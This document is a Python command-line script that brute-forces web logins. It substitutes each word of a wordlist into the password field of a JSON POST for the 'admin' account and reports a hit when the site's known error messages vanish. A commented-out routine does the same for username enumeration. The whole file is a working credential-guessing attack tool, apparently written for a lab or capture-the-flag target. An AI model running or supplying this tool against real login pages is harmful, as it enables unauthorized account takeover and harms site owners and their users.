

import requests
import argparse


''' maybe deprecated
# opens wordlist
# iterates words
# replaces FUZZ values in data with word 
# if f(r.text) is ture, then we WIN and execution dies
def post_n_find(url, data, check):
    with open(wordlist, 'rb') as f:
        for word in f.readlines():
            word = word.strip().decode('utf-8')
            for thing in data:
                if data[thing]=='FUZZ': data[thing] = word
            r = requests.post(url, data=data)
            if r.status_code not in [200]:
                print(f'bad status on {word}-> {r.status_code}')
                exit()
            if check(r.text):
                print(f'IT WORKED!? -> {word}')
                print(f'{r.status_code=}')
                print(f'{r.headers=}')
                print(f'{r.content=}')
                exit()
            #else: print(f'failed -> {word}')
'''

# do the post request
def json_post(url, json):
    r = requests.post(url, json=json)
    #print(f'{r.status_code=}')
    #print(f'{r.headers=}')
    #print(f'{r.text=}')
    #print(f'{r.content=}')
    return r

# iterates obj
# replaces all values 'FUZZ' with word
# returns
def replace_fuzz_in_obj(obj, word, keyword='FUZZ'):
    fuzz_replaced = False
    r_obj = { **obj }
    for key in obj:
        if obj[key] == keyword:
            r_obj[key] = word
            fuzz_replaced = True
    assert fuzz_replaced, 'FUZZ replacement error'
    return r_obj

# wordlist = a wordlist file
# post_data = post data with FUZZ keyword
# url = url to send post
# fn = function that accepts request.post response, does a test, and returns True|False
# start_at = skip all words until this one
def doAll(wordlist, post_data, url, fn, start_at=False):
    started = False if start_at else True
    with open(wordlist, 'r', errors='replace') as file:
        for word in file.readlines():
            word = word.strip()
            if word == start_at: started=True
            if not started: continue
            print(f'trying {word} ... ', end='')
            new_post_data = replace_fuzz_in_obj(post_data, word)
            resp = json_post(url, new_post_data)
            if fn(resp):
                print()
                print(f'---> SUCCESS??? <---')
                print(f'{word=}')
                print(f'{resp.status_code=}')
                print(f'{resp.headers=}')
                print(f'{resp.text=}')
                print()
                exit()
            else:
                print(f'NOPE')
            
    

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='sends a post request and checks the results')
    parser.add_argument('-u', '--url', help='url to send post to', required=True)
    parser.add_argument('-w', '--wordlist', help='wordlist to iterate through', required=True)
    args = parser.parse_args()

    url = args.url
    wordlist = args.wordlist

    #data = { 'user_login': 'FUZZ' }
    #f = lambda x: 'Invalid username or email' not in x 
    #post_n_find(url, data, f)

    post_data = {
        'device_id':'',
        'login_id':'admin',
        'password':'FUZZ',
        'token':''
        }
    # if this func returns true, then we should have a match
    fn = lambda x: 'Enter a valid email or username and/or password.' not in x.text and 'Password field must not be blank' not in x.text
    doAll(wordlist, post_data, url, fn, start_at='darkside')